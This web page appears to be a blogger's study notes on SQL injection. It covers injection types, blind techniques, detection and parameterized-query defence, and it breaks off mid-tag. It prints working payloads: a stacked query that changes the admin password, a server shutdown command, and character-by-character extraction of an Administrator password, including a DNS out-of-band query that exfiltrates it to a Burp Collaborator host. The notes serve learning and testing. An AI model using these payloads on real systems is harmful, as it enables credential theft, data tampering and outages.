<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Meow’s CyberAttack - SQL Injection" /><meta property="og:locale" content="en" /><meta name="description" content="[toc]" /><meta property="og:description" content="[toc]" /><link rel="canonical" href="https://ocholuo.github.io//posts/CyberAttack-SQL-injection/" /><meta property="og:url" content="https://ocholuo.github.io//posts/CyberAttack-SQL-injection/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-09-17T11:11:11-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Meow’s CyberAttack - SQL Injection" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-30T21:02:21-04:00","datePublished":"2020-09-17T11:11:11-04:00","description":"[toc]","headline":"Meow’s CyberAttack - SQL Injection","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/CyberAttack-SQL-injection/"},"url":"https://ocholuo.github.io//posts/CyberAttack-SQL-injection/"}</script><title>Meow's CyberAttack - SQL Injection | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Meow's CyberAttack - SQL Injection</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Meow's CyberAttack - SQL Injection</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Sep 17, 2020, 11:11 AM -0400" >Sep 17, 2020<i class="unloaded">2020-09-17T11:11:11-04:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sun, Oct 30, 2022, 6:02 PM -0700" >Oct 30, 2022<i class="unloaded">2022-10-30T21:02:21-04:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="7732 words">42 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><p>[toc]</p><hr /><h1 id="meows-cyberattack---sql-injection">Meow’s CyberAttack - SQL Injection</h1><hr /><p>cross-site scripting is not the only place where URL encoding is used.</p><ul><li>Anywhere you want to obscure text, you can URL-encode it.<li>makes it harder for users to understand, can’t convert the hexadecimal to ASCII.<li>attacks can be obscured or made successful through <code class="language-plaintext highlighter-rouge">URL encoding</code><ul><li>SQL injection is one of them.</ul></ul><p><strong>SQL (Structured Query Language)</strong>:</p><ul><li>the defacto language used for communicating with online / relational databases.<li>used to <code class="language-plaintext highlighter-rouge">make programmatic requests of a relational database server</code>.<ul><li>The server manages the storage, vary from one server type to another,<li>but in order to get to the storage, inserting data or retrievingit, use SQL</ul></ul><p><strong>SQL injection / insertion attack</strong>:</p><ul><li>an attack against the database server/database application of a web server<li><code class="language-plaintext highlighter-rouge">acquire sensitive info in the database</code> or <code class="language-plaintext highlighter-rouge">to execute remote code</code>.<li><code class="language-plaintext highlighter-rouge">manipulates the database code</code> to take advantage of a weakness in it.<ul><li>Sends / injects unexpected data through a web request.<li>Sometimes, form data is passed directly into an SQL query from the application server to the database server to execute.<li>the database could be altered or damaged.<li>data could be extracted<li>have authentication bypassed.</ul></ul><p>The name refers to Microsoft’s SQL database, but it is also applicable to other databases slike Oracle Net Listener, MySQL.</p><ul><li>One version of the attack occurs when the user input stream contains a string literal escape characters and these characters are not properly screened.<li>Example:<li>the ‘ character in the username field.<li>This input can modify the results of SQL statements conducted on the database and result in manipulation of the database contents and the Web server.<li>One reason for this is that error messages displayed by the SQL server from incorrect inputs such as the ‘ character in the username can provide valuable information, such as password hashes, usernames, and the database name, to an attacker.</ul><p>database factores:</p><ul><li>Syntax for string concatenation<li>comments<li>batched/stacked quesries<li>platform-specific APIs<li>Error messages</ul><hr /><h2 id="type-of-sql-injection">type of SQL injection</h2><p>Traditionally, classify the types of SQL injection in accordance with <code class="language-plaintext highlighter-rouge">order of injection</code>, <code class="language-plaintext highlighter-rouge">input data type</code>, <code class="language-plaintext highlighter-rouge">server response</code> and <code class="language-plaintext highlighter-rouge">data extraction channel</code>.</p><p>The framework of order of injection:</p><ul><li><strong>first order injection</strong>:<ul><li>the attacker enters a malicious string and commands it to be executed immediately.<li>app take user input from the HTTP request, incorporates the input to an SQL query in an unsafe way.</ul><li><strong>second order injection / stored SQL injection attack</strong><ul><li>the attacker inputs a malicious string that is rather resistant and stealthy.<li>app take user input from the HTTP request, and stored it (in database…) for future use.<li>This string is executed when a trigger activity is realized.<li>another SQL, database retrieves the stored data and incorporates the input to an SQL query in an unsafe way.<li>example:<ul><li>setup user:<li>name: <code class="language-plaintext highlighter-rouge">badguy'; update users set passwd='123' where user='admin'--</code><li>passwd: 123<li>stored in database<li>login:<li><code class="language-plaintext highlighter-rouge">Select * from usertable where user = 'badguy'; update users set passwd='12345' where user='admin'--'</code><li>change passwd for admin</ul></ul></ul><p><img data-proofer-ignore data-src="https://i.imgur.com/82YEpIO.png" alt="Screen Shot 2020-11-19 at 02.09.39" /></p><p>input data type classification:</p><ul><li>String based injection and integer based injection.<li>string based injection differs from an integer based injection in the ability to display the results of the SQLi query.<li>In string based injection, it is not possible to see the results of an injection in real time.</ul><p>use server response as a criterion</p><ul><li>error based SQLi and blind based SQLi.<li>In <strong>error based SQLi</strong>, the attacker exploits the error messages created by the data server.<li>In <strong>blind based SQLi</strong>, the attacker employs a method that aims to exploit the database through asking true or false questions.</ul><hr /><h3 id="blind-sql-injection-attacks">Blind SQL injection attacks</h3><ul><li>injection attack on a web server based on <code class="language-plaintext highlighter-rouge">responses to True/False questions</code>.<li>Not all queries will generate output.<li>be flying blind because<ul><li><strong>can’t see the results of the query</strong>.<ul><li><code class="language-plaintext highlighter-rouge">does not display errors with information about the injection results to the attacker</code>.</ul><li><strong>need to change your approach</strong>.<ul><li>structure your query so you get either success or failure that you can see because of how the application works.</ul></ul><li>The purpose of a blind injection: <code class="language-plaintext highlighter-rouge">see if the page behaves differently based on the input provided</code>.<ul><li>This may allow you to determine whether a page is vulnerable to SQL injection before you spend a lot of time trying to run these attacks.<li>try to get a false by appending “and 1=2”.<ul><li>Since 1 never equals 2, the entire search should return false.<li>see the results from that page</ul><li>run another query that should generate a true. l=l.<ul><li>If you get a different result from the query 1=1 than you did from 1=2,<li>the page may be vulnerable to SQL injection.</ul><li>make this assumption because the response from the app was different when different SQL was submitted.</ul></ul><hr /><h4 id="exploiting-blind-sql-injection-by-triggering-conditional-responses">Exploiting blind SQL injection by triggering conditional responses</h4><ul><li>Consider an application that uses tracking cookies to gather analytics about usage.<ul><li>Requests to the application include a cookie header like this:<ul><li><code class="language-plaintext highlighter-rouge">Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</code></ul><li>When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:<ul><li><code class="language-plaintext highlighter-rouge">SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'</code></ul></ul><li>This query is vulnerable to SQL injection<li>the results from the query are not returned to the user.<li>but the application does behave differently depending on whether the query returns any data.<li><p>If it returns data (because a recognized TrackingId was submitted), then a “Welcome back” message is displayed within the page.</p><li>This behavior is enough to be able to exploit the blind SQL injection vulnerability and retrieve information, by triggering different responses conditionally, depending on an injected condition.<li>To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:</ul><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>xyz' UNION SELECT 'a' WHERE 1=1--
xyz' UNION SELECT 'a' WHERE 1=2--

The first of these values will cause the query to return results
- because the injected or 1=1 condition is true,
- and so the "Welcome back" message will be displayed.

The second value will cause the query to not return any results,
- because the injected condition is false,
- and so the "Welcome back" message will not be displayed.
</pre></table></code></div></div><blockquote><p>This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.</p></blockquote><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre>suppose a table called Users
- columns: Username and Password
- a user called Administrator.

We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time.

1. start with the following input:

	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 'm'--

	- This returns the "Welcome back" message, indicating that the injected condition is true,
	- and so the first character of the password is greater than m.


2. Next send the following input:

	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 't'--

	- This does not return the "Welcome back" message, indicating that the injected condition is false,
	- and so the first character of the password is not greater than t.


3. Eventually, confirming that the first character of the password is s:

	xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'--


4. continue this process to systematically determine the full password for the Administrator user.

Note: The SUBSTRING function is called SUBSTR on some types of database.
For more details, see the SQL injection cheat sheet.
</pre></table></code></div></div><hr /><h4 id="inducing-conditional-responses-by-triggering-sql-errors">Inducing conditional responses by triggering SQL errors</h4><p>suppose instead that the application carries out the same SQL query, but does not behave any differently depending on whether the query returns any data.</p><ul><li>The preceding technique will not work,<li>because injecting different Boolean conditions makes no difference to the application’s responses.</ul><p>In this situation, induce the application to return conditional responses by triggering SQL errors conditionally, depending on an injected condition.</p><ul><li>This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.<li>Very often, an unhandled error thrown by the database will cause some difference in the application’s response (such as an error message), allowing us to infer the truth of the injected condition.</ul><p>These inputs use the <code class="language-plaintext highlighter-rouge">CASE</code> keyword to <code class="language-plaintext highlighter-rouge">test a condition</code> and <code class="language-plaintext highlighter-rouge">return a different expression depending on whether the expression is true</code>.</p><ul><li>Assuming the error causes some difference in the application’s HTTP response, use this difference to infer whether the injected condition is true.</ul><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="n">xyz</span><span class="s">' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
# the case expression evaluates to NULL, does not cause any error.

xyz'</span> <span class="n">UNION</span> <span class="n">SELECT</span> <span class="n">CASE</span> <span class="nc">WHEN </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="n">THEN</span> <span class="mi">1</span><span class="o">/</span><span class="mi">0</span> <span class="n">ELSE</span> <span class="n">NULL</span> <span class="n">END</span><span class="o">--</span>
<span class="c1"># it evaluates to 1/0, which causes a divide-by-zero error.
</span>

<span class="c1"># to retrieve data by systematically testing one character at a time:
</span><span class="n">xyz</span><span class="s">' union select case when (username = '</span><span class="n">Administrator</span><span class="s">' and SUBSTRING(password, 1, 1) &gt; '</span><span class="n">m</span><span class="s">') then 1/0 else null end from users--
</span></pre></table></code></div></div><blockquote><p>Note: There are various ways of triggering conditional errors, and different techniques work best on different types of database.</p></blockquote><hr /><h4 id="exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting blind SQL injection by triggering time delays</h4><p>suppose that the application now catches database errors and handles them gracefully.</p><ul><li>Triggering a database error when the injected SQL query is executed no longer causes any difference in the application’s response, so the preceding technique of inducing conditional errors will not work.</ul><p>to exploit the blind SQL injection vulnerability by triggering <strong>time delays conditionally</strong>, depending on an injected condition.</p><ul><li>Because SQL queries are generally processed synchronously by the application,<li>delaying the execution of an SQL query will also delay the HTTP response.<li>This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received.</ul><p>The techniques for triggering a time delay are highly specific to the type of database being used.</p><ul><li>On Microsoft SQL Server, input like the following can be used to test a condition and trigger a delay depending on whether the expression is true:</ul><div class="language-py highlighter-rouge"><div class="code-header" text-data="py"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="s">'; IF (1=2) WAITFOR DELAY '</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s">'--
# will not trigger a delay, because the condition 1=2 is false

'</span><span class="p">;</span> <span class="nc">IF </span><span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="n">WAITFOR</span> <span class="n">DELAY</span> <span class="s">'0:0:10'</span><span class="o">--</span>
<span class="c1"># will trigger a delay of 10 seconds, because the condition 1=1 is true.
</span></pre></table></code></div></div><p>retrieve data in the way already described, by systematically testing one character at a time:</p><p><code class="language-plaintext highlighter-rouge">'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'--</code></p><blockquote><p>Note: There are various ways of triggering time delays within SQL queries, and different techniques apply on different types of database</p></blockquote><hr /><h4 id="exploiting-blind-sql-injection-using-out-of-band-oast-techniques">Exploiting blind SQL injection using out-of-band (OAST) techniques</h4><p>Now, suppose that the application carries out the same SQL query, but does it asynchronously.</p><ul><li>The application continues processing the user’s request in the original thread,<li>and uses another thread to execute an SQL query using the tracking cookie.<li>The query is still vulnerable to SQL injection,<li>however none of the techniques described so far will work:<li>the application’s response doesn’t depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query.</ul><p>In this situation, exploit the blind SQL injection vulnerability by triggering <strong>out-of-band network interactions</strong> to a system that you control.</p><ul><li>As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time.<li>But more powerfully, data can be exfiltrated directly within the network interaction itself.</ul><p>A variety of network protocols can be used for this purpose,</p><ul><li>typically the most effective is DNS (domain name service), because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.</ul><p>The easiest and most reliable way to use out-of-band techniques is using <strong>Burp Collaborator</strong>.</p><ul><li>This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.<li>Support for Burp Collaborator is built in to Burp Suite Pro</ul><p>The techniques for triggering a DNS query are highly specific to the type of database being used.</p><ul><li>On Microsoft SQL Server,<ul><li><code class="language-plaintext highlighter-rouge">'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--</code><li>to cause a DNS lookup on a specified domain<li>cause the database to perform a lookup for the following domain:<li><code class="language-plaintext highlighter-rouge">0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net</code></ul></ul><p>You can use Burp Suite’s Collaborator client to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.</p><p>Having confirmed a way to trigger out-of-band interactions, then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:</p><p><code class="language-plaintext highlighter-rouge">'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--</code></p><ul><li>This input reads the password for the Administrator user,<li>appends a unique Collaborator subdomain,<li>and triggers a DNS lookup.<li>This will result in a DNS lookup like the following, allowing you to view the captured password:</ul><p><code class="language-plaintext highlighter-rouge">S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net</code></p><p><strong>Out-of-band (OAST) techniques</strong> are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.</p><hr /><p>How to prevent blind SQL injection attacks? Although the techniques needed to find and exploit blind SQL injection vulnerabilities are different and more sophisticated than for regular SQL injection, the measures needed to prevent SQL injection are the same regardless of whether the vulnerability is blind or not.</p><p>As with regular SQL injection, blind SQL injection attacks can be prevented through the careful use of parameterized queries, which ensure that user input cannot interfere with the structure of the intended SQL query.</p><hr /><h2 id="launch">launch:</h2><p>target Applications to attack with SQL injection must already have SQL in place</p><ul><li>to run a query necessary for the application to succeed.<li>Example:<li>search on the site for “jodie whitta ker doll”, get the right results back.<ul><li>Behind the scenes, the application may have an SQL statement that reads<li><code class="language-plaintext highlighter-rouge">SELECT * FROM inventory_table WHERE description == '$searchstr'</code> ;</ul><li>need to find a way to get your query to work in the context of the existing one.<li>Damn Vulnerable Web App<li>a deliberately vulnerable web application<li>used to learn, try against different levels of security in the application.<li>The string entered: ‘ or ‘a’ = ‘ a. User ID: ‘ ‘ or ‘a’ = ‘ a ’<li>uses the single quote to close out the existing query string and then introduces the Boolean logicterm or along with a test that will return a true.<li>This means the overall expression will return true.<li>Every row in the database will evaluate to true. Since the query here likely starts with <code class="language-plaintext highlighter-rouge">SELECT *</code>, we get every row in the database back.</ul><p>the query inserted leaves the last quote out, the query in the application already has a single quote at the end.</p><ul><li>may not always work, depending on the SQL query in place in the app<li>In some cases, you may need to replace the rest of the query in the application. This can be done using comment characters.<li>SQL server based on MySQL, MariaDB: use the double dash <code class="language-plaintext highlighter-rouge">--</code> to indicate a comment.<ul><li>Everything after your double dash is commented out.<li>allow you to inject your own complete SQL statement and then just comment out everything else in the application.<li>MySQL syntax also allows the use of the <code class="language-plaintext highlighter-rouge">#</code> to indicate a comment. like the double dash.</ul><li>In Oracle / Microsoft SQL Server, the double dash also works.<ul><li>semicolon (<code class="language-plaintext highlighter-rouge">;</code>) to indicate the end of the SQL line,<li>two dashes (<code class="language-plaintext highlighter-rouge">--</code>) as an ignored comment.</ul><li>Various types of exploits use SQL injection, common categories:<ul><li>Escape characters not filtered correctly<li>Type handling not properly done<li>Conditional errors<li>Time delays</ul></ul><p>SQL doesn’t always work the same, to determine the underlying database server.</p><ol><li>based on the <code class="language-plaintext highlighter-rouge">reconnaissance</code> did earlier.<ul><li>example,<li>a poorly configured Apache server may tell you what modules are loaded.</ul><li>based on the <code class="language-plaintext highlighter-rouge">results of an application version scan</code> that there is a MySQL server.<ul><li>If you are doing against a Microsoft IIS installation, you could guess it may be Microsoft SQL Server.</ul><li><code class="language-plaintext highlighter-rouge">introduce invalid SQL into the application</code>.<ul><li>If the application is well programmed, should not get anything back<li>error message could includes the database server or the server type because of the wording of the error.<li>If the application doesn’t include error-handling routines, these errors provide details about the type of database the application is using,<ul><li>such as an Oracle, Microsoft SQL Server, or MySQL database.</ul><li>Different databases format SQL statements slightly differently, but learns the database brand, it’s a simple matter to format the SQL statements required by that brand.<li>The attacker then follows with SQL statements to access the database and may allow the attacker to read, modify, delete, and/or corrupt data.</ul></ol><ul><li>Communicate with a database, have a SQL statements executed when someone clicks a logon button.<ul><li>SQL statements take the username and password entered, and query the database to see if they are correct.</ul><li>Problem begins with the way websites are written.<ul><li>written in some scripting, markup, or programming language, like HTML (Hypertext Markup Language), PHP (PHP: Hypertext Preprocessor), ASP (Active Server Pages)…<li>These languages don’t understand SQL,<li>the SQL statements are usually put into a string.</ul></ul><hr /><h2 id="sql-injection-vulnerabilities">SQL Injection Vulnerabilities</h2><p><strong>Databases</strong> supporting web servers and applications</p><ul><li>attractive targets for hackers.<li>The information contained in these databases can be sensitive and critical to an organization.<li>The most popular database systems<ul><li>Microsoft SQL, ports 1433<li>MySQL, ports 3306<li>and Oracle Net Listener, ports 159</ul></ul><p>A popular and effective attack against database applications on web servers: SQL injection.</p><ul><li>This type of attack takes advantage of SQL server vulnerabilities, such as lack of proper input string checking and failure to install critical patches in a timely fashion.</ul><p>SQL Injection Testing and Attacks</p><ul><li>An SQL injection attack exploits vulnerabilities in a web server database<li>These vulnerabilities arise because:<ul><li>the database <code class="language-plaintext highlighter-rouge">does not filter escape characters </code><li>the database <code class="language-plaintext highlighter-rouge">does not use strong typing</code>, which prohibits input statements from being interpreted as instructions.</ul><li>allow the attacker to<ul><li>gain access to the database<li>read, modify, or delete information.<li>even gain system privileges for the computer itself with some SQL injection exploits.<li>database footprinting<ul><li>identifies the database tables and forms the basis for other attacks.</ul></ul></ul><p>to detect SQL injection vulnerabilities</p><ul><li>SQL injection can be detected manually by using a systematic set of tests against every entry point in the application. This typically involves:<ul><li>Submitting the <code class="language-plaintext highlighter-rouge">single quote character '</code> and looking for errors or other anomalies.<li>Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.<li>Submitting Boolean conditions such as <code class="language-plaintext highlighter-rouge">OR 1=1</code> and <code class="language-plaintext highlighter-rouge">OR 1=2</code>, and looking for differences in the application’s responses.<li>Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.<li>submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.</ul></ul><hr /><h2 id="preparing-for-an-attack">Preparing for an Attack</h2><p>To conduct an SQL injection, a hacker initially test a database to determine if it is susceptible to such an attack.</p><ul><li>place a <code class="language-plaintext highlighter-rouge">single quote character ' </code>, into the query string of a URL.<ul><li>Desired response: an <strong>Open DataBase Connectivity (ODBC) error message</strong><li>ODBC:<ul><li>indicates a vulnerability to an SQL injection attack.<li>a standard database access process that provides the ability to access data from any application, independent of the <strong>database management system (DBMS)</strong> being used.<li>This “universality” is made possible by a database driver layer that <code class="language-plaintext highlighter-rouge">translates the database data queries into commands</code> that are recognized by the particular DBMS involved.</ul><li>the return of an error message indicates that injection will work.<li>It is important to search the returned page for words such as ODBC or syntax.</ul></ul><blockquote><p>A typical <strong>ODBC error message</strong> is: Microsoft OLE DB Provider for ODBC Drivers error ‘80040el4’ [Microsoft] [ODBC SQL Server Driver] [SQL Server]Incorrect syntax near the keyword ‘and’ . /wasc.asp, line 68</p></blockquote><ul><li>If the website is supported by a backend database that incorporates scripting languages, like CGI or asp and dynamic data entry, the site is likely to be amenable to SQL injection exploits.<ul><li>Therefore, testing for vulnerabilities is enhanced if Web pages at a URL request input: logins, passwords, or search boxes.<li>Also, the <code class="language-plaintext highlighter-rouge">HTML source code</code> might contain FORM tags that support sending using a <code class="language-plaintext highlighter-rouge">POST</code> command to pass parameters to other asp pages.<li>The code between the FORM tags is susceptible to SQL injection testing, such as entering the <code class="language-plaintext highlighter-rouge">'</code> character.</ul></ul><blockquote><p>A sample of such HTML source code is: &lt;FORM action=Search/search.asp method=post&gt; &lt;input: type=hidden name=C value=D&gt; &lt;/FORM&gt;</p></blockquote><ul><li>Use a direct injection:<ul><li>using an SQL statement and adding a space and the word OR to the parameter value in the query.<li>If an error message is generated, the database is vulnerable to an SQL injection attack.</ul><li>quoted injection test:<ul><li>where a parameter in the argument of an SQL statement is modified by preﬁxing and appending it with quotes.</ul><li>Another testing option, use automated vulnerability scanning tools:<ul><li>WebInspect and Acunetix.</ul></ul><hr /><h2 id="conducting-an-attack">Conducting an Attack</h2><ol><li>put a SQL statement in the fields that is always true<li>comments out the second single quote to prevent a SQL error.</ol><p><code class="language-plaintext highlighter-rouge">1=1</code></p><ul><li><code class="language-plaintext highlighter-rouge">SELECT * FROM tblUSERS WHERE UserName ='' AND Password = ''</code><ul><li><code class="language-plaintext highlighter-rouge">SELECT * FROM tblUSERS WHERE UserName ='admin' AND Password = 'password''</code>;<li>attacker will <strong>put a SQL statement in the fields that is always true</strong>,<ul><li>like: <code class="language-plaintext highlighter-rouge">' or '1' ='1</code></ul><li><code class="language-plaintext highlighter-rouge">SELECT * FROM tblUSERS WHERE UserName ='' or '1' ='1' AND Password = '' or '1' ='1''</code></ul><li>Input: Darril Gibson<ul><li><code class="language-plaintext highlighter-rouge">SELECT * FROM Books WHERE Author='Darril Gibson'</code><li>Acctack input: <code class="language-plaintext highlighter-rouge">Darril Gibson'; SELECT * FROM Customers; --</code><li><code class="language-plaintext highlighter-rouge">SELECT * FROM Books WHERE Author='Darril Gibson'; SELECT * FROM Customers;</code> –’<ul><li>reads all the data in the Customers table: names, credit card data, and more.<li>SQL Server ignores everything after a <code class="language-plaintext highlighter-rouge">--</code><li>comments out the second single quote to prevent a SQL error.<li>The <code class="language-plaintext highlighter-rouge">; character</code>: denotes the end of an SQL query statement</ul></ul></ul><p><code class="language-plaintext highlighter-rouge">' or username is not null or username= '</code></p><ul><li><code class="language-plaintext highlighter-rouge">SELECT Username FROM Users WHERE Username = '';</code><li><code class="language-plaintext highlighter-rouge">SELECT Username FROM Users WHERE Username= '' or Username is not null or Username= '';</code></ul><p><code class="language-plaintext highlighter-rouge">; shutdown with nowait;--</code></p><ul><li>SQL server provides another command that can be used in SQL injection:<li>This command will terminate the server operation and implement an attack with the following responses:<ul><li>Username: <code 